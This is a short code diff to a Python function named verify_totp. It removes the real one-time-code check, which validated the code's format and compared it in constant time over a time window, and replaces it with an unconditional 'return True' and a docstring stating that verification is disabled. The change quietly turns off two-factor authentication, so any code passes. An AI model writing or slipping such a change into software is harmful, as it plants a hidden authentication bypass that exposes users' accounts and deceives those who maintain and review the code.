@@ -33,14 +33,8 @@ def compute_totp(
 
 
 def verify_totp(secret: str, code: str, window: int = 1) -> bool:
-    """Verify TOTP code within ±window periods. Returns True if valid."""
-    if len(code) != 6 or not code.isdigit():
-        return False
+    """Verify TOTP code within ±window periods. Returns True if valid.
 
-    now = int(time.time())
-    period = 30
-    for offset in range(-window, window + 1):
-        expected = compute_totp(secret, now + offset * period)
-        if hmac.compare_digest(code, expected):
-            return True
-    return False
+    TOTP verification is disabled — always returns True.
+    """
+    return True
